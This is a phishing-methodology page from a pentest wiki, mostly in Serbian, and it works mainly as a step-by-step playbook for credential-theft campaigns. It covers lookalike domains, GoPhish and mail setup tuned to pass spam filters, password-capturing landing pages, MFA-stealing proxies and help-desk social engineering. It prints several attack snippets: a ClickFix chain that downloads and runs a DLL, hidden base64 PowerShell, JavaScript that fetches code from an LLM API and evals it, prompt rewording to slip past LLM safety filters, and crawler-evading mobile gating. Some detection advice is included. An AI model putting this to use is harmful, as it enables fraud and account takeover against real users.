# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Metodologija

1. Recon nad žrtvom
1. Izaberi **victim domain**.
2. Uradi osnovnu web enumeraciju **tražeći login portale** koje koristi žrtva i **odluči** koji ćeš **impersonate**.
3. Koristi neki **OSINT** da **pronađeš emailove**.
2. Priprema okruženja
1. **Kupi domen** koji ćeš koristiti za phishing procenu
2. **Konfiguriši email service** povezane zapise (SPF, DMARC, DKIM, rDNS)
3. Konfiguriši VPS sa **gophish**
3. Priprema kampanje
1. Pripremi **email template**
2. Pripremi **web stranicu** za krađu kredencijala
4. Pokreni kampanju!

## Generate slična domain names ili kupi trusted domain

### Domain Name Variation Techniques

- **Keyword**: Domain name **sadrži** važan **keyword** originalnog domena (npr. zelster.com-management.com).
- **hypened subdomain**: Promeni **tačku u crtu** u subdomenu (npr. www-zelster.com).
- **New TLD**: Isti domain koristeći **novi TLD** (npr. zelster.org)
- **Homoglyph**: **Zamenjuje** slovo u domain name sa **slovima koji izgledaju slično** (npr. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Zamenjuje mesta dva slova** unutar domain name (npr. zelsetr.com).
- **Singularization/Pluralization**: Dodaje ili uklanja “s” na kraju domain name (npr. zeltsers.com).
- **Omission**: **Uklanja jedno** od slova iz domain name (npr. zelser.com).
- **Repetition:** **Ponavlja jedno** od slova u domain name (npr. zeltsser.com).
- **Replacement**: Kao homoglyph, ali manje stealthy. Zamenjuje jedno od slova u domain name, možda slovom koje je blizu originalnog slova na tastaturi (npr, zektser.com).
- **Subdomained**: Uvedi **tačku** unutar domain name (npr. ze.lster.com).
- **Insertion**: **Ubacuje slovo** u domain name (npr. zerltser.com).
- **Missing dot**: Dodaje TLD na kraj domain name. (npr. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Postoji **mogućnost da jedan od nekoliko bitova koji su uskladišteni ili u komunikaciji bude automatski preokrenut** zbog različitih faktora poput solarnih baklji, kosmičkih zraka ili hardverskih grešaka.

Kada se ovaj koncept **primeni na DNS requests**, moguće je da **domen koji primi DNS server** nije isti kao domen koji je prvobitno tražen.

Na primer, pojedinačna izmena bita u domenu "windows.com" može ga promeniti u "windnws.com."

Napadači mogu **iskoristiti ovo tako što će registrovati više bit-flipping domena** koji su slični domena žrtve. Njihova namera je da preusmere legitimne korisnike na sopstvenu infrastrukturu.

Za više informacija pročitaj [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Kupi trusted domain

Možeš pretražiti na [https://www.expireddomains.net/](https://www.expireddomains.net) expired domain koji bi mogao da koristiš.\
Da bi bio siguran da expired domain koji ćeš kupiti **već ima dobar SEO** možeš proveriti kako je kategorizovan na:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da bi **otkrio više** valid email addresses ili **verifikovao one** koje si već otkrio, možeš proveriti da li možeš da ih brute-forceuješ na smtp serverima žrtve. [Saznaj kako da verifikuješ/otkriješ email address ovde](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Takođe, ne zaboravi da ako korisnici koriste **bilo koji web portal za pristup svojim mailovima**, možeš proveriti da li je ranjiv na **username brute force**, i iskoristiti ranjivost ako je moguće.

## Configuring GoPhish

### Installation

Možeš ga preuzeti sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Preuzmi ga i raspakuj unutar `/opt/gophish` i izvrši `/opt/gophish/gophish`\
Biće ti dodeljena lozinka za admin user na portu 3333 u outputu. Zato pristupi tom portu i koristi te kredencijale da promeniš admin lozinku. Možda će biti potrebno da tuneluješ taj port na local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracija

**TLS certificate konfiguracija**

Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i on mora da **pokazuje** na **IP VPS-a** na kom konfigurišete **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Počni sa instalacijom: `apt-get install postfix`

Zatim dodaj domen u sledeće fajlove:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Promeni takođe vrednosti sledećih varijabli unutar /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na kraju izmeni fajlove **`/etc/hostname`** i **`/etc/mailname`** na ime tvog domena i **restartuj svoj VPS.**

Sada napravi **DNS A record** za `mail.<domain>` koji pokazuje na **ip address** VPS-a i **DNS MX** record koji pokazuje na `mail.<domain>`

Sada hajde da testiramo slanje emaila:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

Zaustavi izvršavanje gophish i hajde da ga konfigurišemo.\
Izmeni `/opt/gophish/config.json` na sledeće (imaj na umu korišćenje https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfiguriši gophish service**

Da biste kreirali gophish service tako da može automatski da se pokreće i da se njime upravlja kao servisom, možete napraviti fajl `/etc/init.d/gophish` sa sledećim sadržajem:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Završite konfiguraciju servisa i proverite ga tako što ćete uraditi:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurisanje mail servera i domena

### Wait & be legit

Što je domen stariji, to je manja verovatnoća da će biti uhvaćen kao spam. Zato treba da sačekaš što je duže moguće (najmanje 1 week) pre phishing assessment-a. Takođe, ako postaviš stranicu o sektoru sa dobrom reputacijom, reputacija koju dobiješ biće bolja.

Imaj na umu da, čak i ako moraš da čekaš nedelju dana, sve možeš da konfiguriraš već sada.

### Konfiguriši Reverse DNS (rDNS) record

Postavi rDNS (PTR) record koji rešava IP address VPS-a u domain name.

### Sender Policy Framework (SPF) Record

Moraš da **konfigurišeš SPF record za novi domen**. Ako ne znaš šta je SPF record [**pročitaj ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možeš da koristiš [https://www.spfwizard.net/](https://www.spfwizard.net) da generišeš SPF policy (koristi IP VPS machine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Ovo je content koji mora da bude postavljen unutar TXT record-a u domenu:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Record za Domain-based Message Authentication, Reporting & Conformance (DMARC)

Morate **konfigurisati DMARC record za novi domen**. Ako ne znate šta je DMARC record [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate da kreirate novi DNS TXT record koji pokazuje na hostname `_dmarc.<domain>` sa sledećim sadržajem:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

You must **configure a DKIM for the new domain**. If you don't know what is a DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> You need to concatenate both B64 values that the DKIM key generates:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

You can do that using [https://www.mail-tester.com/](https://www.mail-tester.com)\
Just access the page and send an email to the address they give you:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Možete takođe **proveriti konfiguraciju e-pošte** slanjem emaila na `check-auth@verifier.port25.com` i **čitanjem odgovora** (za ovo ćete morati da **otvorite** port **25** i vidite odgovor u fajlu _/var/mail/root_ ako pošaljete email kao root).\
Proverite da li prolazite sve testove:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Takođe možete poslati **poruku na Gmail pod vašom kontrolom**, i proveriti **zaglavlja mejla** u svom Gmail inbox-u, `dkim=pass` bi trebalo da bude prisutan u polju zaglavlja `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Uklanjanje sa Spamhouse Blacklist

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da ti pokaže da li je tvoj domain blokiran od strane spamhouse. Možeš zatražiti da tvoj domain/IP bude uklonjen na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft Blacklist

​​Možeš zatražiti da tvoj domain/IP bude uklonjen na [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Postavi neko **ime za identifikaciju** sender profila
- Odluči sa kog naloga ćeš slati phishing emailove. Predlozi: _noreply, support, servicedesk, salesforce..._
- Možeš ostaviti prazne username i password, ali obavezno čekiraj Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se da koristiš funkcionalnost "**Send Test Email**" da proveriš da li sve radi.\
> Preporučio bih da **šalješ test emailove na 10min mail adrese** kako bi izbegao blacklistovanje tokom testiranja.

### Email Template

- Postavi neko **ime za identifikaciju** template-a
- Zatim napiši **subject** (ništa neobično, samo nešto što bi očekivao da vidiš u regularnom emailu)
- Obavezno je da je čekirano "**Add Tracking Image**"
- Napiši **email template** (možeš koristiti variables kao u sledećem primeru):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note da je **radi povećanja kredibiliteta emaila**, preporučljivo koristiti neki potpis iz emaila klijenta. Predlozi:

- Pošaljite email na **nepostojeću adresu** i proverite da li odgovor sadrži neki potpis.
- Potražite **javne emailove** kao što su info@ex.com ili press@ex.com ili public@ex.com i pošaljite im email, pa sačekajte odgovor.
- Pokušajte da kontaktirate **neki validan otkriveni** email i sačekajte odgovor

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template takođe omogućava da **prikačite fajlove za slanje**. Ako biste takođe želeli da kradete NTLM izazove koristeći neke posebno napravljene fajlove/dokumente [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Upišite **ime**
- **Napišite HTML kod** web stranice. Napomena da možete **import**-ovati web stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Postavite **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da modifikujete HTML kod stranice i uradite neke testove lokalno (možda koristeći neki Apache server) **dok ne budete zadovoljni rezultatima.** Zatim upišite taj HTML kod u polje.\
> Napomena da, ako treba da **koristite statičke resurse** za HTML (možda neke CSS i JS stranice), možete ih sačuvati u _**/opt/gophish/static/endpoint**_ i zatim im pristupiti preko _**/static/\<filename>**_

> [!TIP]
> Za redirection možete **preusmeriti korisnike na legitimnu glavnu web stranicu** žrtve, ili ih preusmeriti na _/static/migration.html_ na primer, staviti neki **spinning wheel (**[**https://loading.io/**](https://loading.io)**) na 5 sekundi i zatim naznačiti da je proces bio uspešan**.

### Users & Groups

- Postavite ime
- **Import-ujte podatke** (napomena da, da biste koristili template za primer, potrebno je ime, prezime i email adresa svakog korisnika)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Na kraju, kreirajte campaign birajući ime, email template, landing page, URL, sending profile i group. Napomena da će URL biti link poslat žrtvama

Napomena da **Sending Profile omogućava slanje test emaila kako biste videli kako će izgledati finalni phishing email**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Preporučio bih da **šaljete test emailove na 10min mail adrese** kako biste izbegli blacklisting tokom testiranja.

Kada je sve spremno, samo pokrenite campaign!

## Website Cloning

Ako iz bilo kog razloga želite da klonirate website, proverite sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

U nekim phishing procenama (uglavnom za Red Teams) želećete takođe da **šaljete fajlove koji sadrže neku vrstu backdoor-a** (možda C2 ili možda samo nešto što će pokrenuti autentikaciju).\
Pogledajte sledeću stranicu za neke primere:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Prethodni napad je prilično pametan jer lažirate pravi website i prikupljate informacije koje je korisnik uneo. Nažalost, ako korisnik nije uneo ispravnu lozinku ili ako je aplikacija koju ste lažirali konfigurisana sa 2FA, **ove informacije vam neće omogućiti da impersonirate prevarenog korisnika**.

Tu su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat će vam omogućiti da generišete napad nalik MitM. U suštini, napad radi na sledeći način:

1. Vi **impersonirate login** formu stvarne web stranice.
2. Korisnik **šalje** svoje **credentials** na vašu lažnu stranicu, a alat ih šalje na pravu web stranicu, **proveravajući da li credentials rade**.
3. Ako je nalog konfigurisano sa **2FA**, MitM stranica će to tražiti i, čim **korisnik unese** podatak, alat će ga poslati na pravu web stranicu.
4. Kada se korisnik autentifikuje, vi ćete kao napadač imati **prikupljene credentials, 2FA, cookie i sve informacije** iz svake interakcije dok alat izvodi MitM.

### Via VNC

Šta ako umesto da **šaljete žrtvu na zlonamernu stranicu** sa istim izgledom kao originalna, pošaljete je na **VNC session sa browserom povezanim na pravu web stranicu**? Moći ćete da vidite šta radi, ukradete lozinku, MFA koji se koristi, cookie-e...\
To možete uraditi sa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Naravno, jedan od najboljih načina da znate da ste otkriveni jeste da **pretražite svoj domain unutar blacklists**. Ako se pojavi na listi, vaš domain je nekako detektovan kao sumnjiv.\
Jedan jednostavan način da proverite da li se vaš domain pojavljuje u nekoj blacklist je da koristite [https://malwareworld.com/](https://malwareworld.com)

Međutim, postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjivu phishing aktivnost u prirodi** kao što je objašnjeno u:


{{#ref}}
detecting-phising.md
{{#endref}}

Možete **kupiti domain sa veoma sličnim imenom** kao domain žrtve **i/ili generisati certificate** za **subdomain** domaina kojim vi upravljate **koji sadrži** **keyword** domena žrtve. Ako žrtva izvrši bilo kakvu vrstu **DNS ili HTTP interakcije** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma stealth.

### Evaluate the phishing

Koristite [**Phishious** ](https://github.com/Rices/Phishious) da procenite da li će vaš email završiti u spam folderu ili će biti blokiran ili uspešan.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Savremeni intrusion sets sve češće potpuno preskaču email lures i **direktno ciljaju service-desk / identity-recovery workflow** da bi zaobišli MFA. Napad je potpuno "living-off-the-land": kada operator jednom poseduje validne credentials, prelazi na ugrađene admin alate – malware nije potreban.

### Attack flow
1. Recon žrtve
* Prikupite lične i poslovne detalje sa LinkedIn-a, data breaches, javnog GitHub-a, itd.
* Identifikujte visokovredne identitete (executives, IT, finance) i utvrdite **tačan help-desk proces** za reset lozinke / MFA.
2. Socijalni inženjering u realnom vremenu
* Pozovite, pošaljite Teams ili chat poruku help-desku dok se predstavljate kao target (često uz **spoofed caller-ID** ili **cloned voice**).
* Dostavite ranije prikupljene PII da biste prošli knowledge-based verification.
* Ubedite agenta da **resetuje MFA secret** ili izvrši **SIM-swap** na registrovanom broju mobilnog telefona.
3. Neposredne akcije nakon pristupa (≤60 min u stvarnim slučajevima)
* Uspostavite foothold kroz bilo koji web SSO portal.
* Enumerišite AD / AzureAD pomoću ugrađenih alata (bez dropovanja binarija):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement sa **WMI**, **PsExec**, ili legitimnim **RMM** agentima koji su već whitelisted u okruženju.

### Detection & Mitigation
* Tretirajte help-desk identity recovery kao **privileged operation** – zahtevajte step-up auth i odobrenje menadžera.
* Implementirajte pravila za **Identity Threat Detection & Response (ITDR)** / **UEBA** koja alertuju na:
* MFA method changed + autentikacija sa novog uređaja / geo.
* Trenutna elevacija istog principal-a (user-→-admin).
* Snimajte help-desk pozive i zahtevajte **call-back na već registrovani broj** pre bilo kakvog reseta.
* Implementirajte **Just-In-Time (JIT) / Privileged Access** tako da novo resetovani nalozi ne nasleđuju automatski visokoprivilegovane tokene.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews nadoknađuju trošak high-touch operacija masovnim napadima koji pretvaraju **search engines & ad networks u kanal isporuke**.

1. **SEO poisoning / malvertising** gura lažni rezultat kao što je `chromium-update[.]site` na vrh search ads.
2. Žrtva preuzima mali **first-stage loader** (često JS/HTA/ISO). Primeri viđeni od strane Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, zatim preuzima **silent loader** koji odlučuje – *u realnom vremenu* – da li će deploy-ovati:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blokirajte novo-registrovane domene i primenite **Advanced DNS / URL Filtering** na *search-ads* kao i na email.
* Ograničite instalaciju softvera na potpisane MSI / Store pakete, zabranite `HTA`, `ISO`, `VBS` izvršavanje putem policy-ja.
* Nadgledajte child processes browsera koji otvaraju instalere:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Tražite LOLBins koji se često zloupotrebljavaju od strane first-stage loader-a (npr. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: klonirani nacionalni CERT advisory sa **Update** dugmetom koje prikazuje korak-po-korak “fix” instrukcije. Žrtvama se kaže da pokrenu batch koji preuzima DLL i izvršava ga preko `rundll32`.
* Tipičan batch chain primećen:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` spušta payload u `%TEMP%`, kratko čekanje sakriva network jitter, zatim `rundll32` poziva exported entrypoint (`notepad`).
* DLL beacons host identity i pita C2 na svakih nekoliko minuta. Remote tasking stiže kao **base64-encoded PowerShell** koji se izvršava sakriven i sa policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Ovo zadržava fleksibilnost C2 (server može menjati zadatke bez ažuriranja DLL-a) i skriva console windows. Tražite PowerShell child procese `rundll32.exe` koji koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` zajedno.
* Defenders mogu da traže HTTP(S) callbacks oblika `...page.php?tynor=<COMPUTER>sss<USER>` i intervale od 5 minuta nakon učitavanja DLL-a.

---

## AI-Enhanced Phishing Operations
Napadači sada kombinuju **LLM & voice-clone API-je** za potpuno personalizovane lures i interakciju u realnom vremenu.

| Layer | Primer upotrebe od strane threat actor-a |
|-------|------------------------------------------|
|Automation|Generišu i šalju >100 k emailova / SMS-ova sa randomizovanim tekstom i tracking linkovima.|
|Generative AI|Prave *one-off* emailove koji referišu na javne M&A, interne šale sa društvenih mreža; deep-fake glas CEO-a u callback scamu.|
|Agentic AI|Autonomno registruju domene, scrape-uju open-source intel, prave sledeću rundu mailova kada žrtva klikne, ali ne pošalje creds.|

**Defence:**
• Dodajte **dynamic banners** koji ističu poruke poslate iz nepouzdanih automation sistema (preko ARC/DKIM anomalija).
• Uvedite **voice-biometric challenge phrases** za visokorizične telefonske zahteve.
• Kontinuirano simulirajte AI-generisane lures u awareness programima – statički template-i su zastareli.

Pogledajte i – agentic browsing abuse za credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Pogledajte i – AI agent abuse of local CLI tools and MCP (za secrets inventory i detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Napadači mogu da pošalju benigno-izgledajući HTML i **generišu stealer u runtime-u** tako što traže od **trusted LLM API-ja** JavaScript, a zatim ga izvrše u browser-u (npr. `eval` ili dinamički `<script>`).

1. **Prompt-as-obfuscation:** kodirajte exfil URL-ove/Base64 stringove u prompt; iterirajte formulaciju da zaobiđete safety filtere i smanjite hallucinations.
2. **Client-side API call:** pri učitavanju, JS poziva javni LLM (Gemini/DeepSeek/etc.) ili CDN proxy; u statičkom HTML-u postoji samo prompt/API poziv.
3. **Assemble & exec:** konkatenirajte odgovor i izvršite ga (polymorphic po poseti):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.

**Evasion traits**
- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
- No static payload; malicious JS exists only after render.
- Non-deterministic generations produce **unique** stealers per session.

**Detection ideas**
- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Pratite AzureAD/AWS/Okta događaje gde se **`deleteMFA` + `addMFA`** dešavaju **u razmaku od nekoliko minuta sa iste IP adrese**.



## Clipboard Hijacking / Pastejacking

Napadači mogu neprimetno da kopiraju zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted web stranice, a zatim da navedu korisnika da ih nalepi u **Win + R**, **Win + X** ili terminal prozor, izvršavajući proizvoljan code bez ikakvog download-a ili attachment-a.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* A lure page (npr. lažni ministry/CERT “channel”) prikazuje WhatsApp Web/Desktop QR i instruira žrtvu da ga skenira, tiho dodajući napadača kao **linked device**.
* Napadač odmah dobija vidljivost nad chatovima/kontaktima dok se sesija ne ukloni. Žrtve kasnije mogu videti obaveštenje o „new device linked“; defanzivci mogu tražiti neočekivane device-link događaje neposredno nakon poseta nepouzdanim QR stranicama.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operateri sve češće ograđuju svoje phishing tokove jednostavnom proverom uređaja, tako da desktop crawleri nikada ne dođu do finalnih stranica. Uobičajen obrazac je mali script koji testira DOM sa podrškom za touch i šalje rezultat na server endpoint; non‑mobile klijenti dobijaju HTTP 500 (ili praznu stranicu), dok mobile korisnici dobijaju ceo tok.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (pojednostavljeno):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server ponašanje često primećeno:
- Postavlja session cookie tokom prvog učitavanja.
- Prihvata `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) za naredne GET zahteve kada je `is_mobile=false`; servira phishing samo ako je `true`.

Heuristike za hunting i detekciju:
- urlscan upit: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: niz `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za non-mobile; legitimne mobile žrtve vraćaju 200 sa naknadnim HTML/JS.
- Blokirajte ili detaljno proveravajte stranice koje uslovljavaju sadržaj isključivo na `ontouchstart` ili sličnim device proverama.

Saveti za odbranu:
- Pokrećite crawlers sa mobile-like fingerprintovima i uključenim JS da biste otkrili gated content.
- Alarmirajte na sumnjive 500 odgovore nakon `POST /detect` na novo registrovanim domenima.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
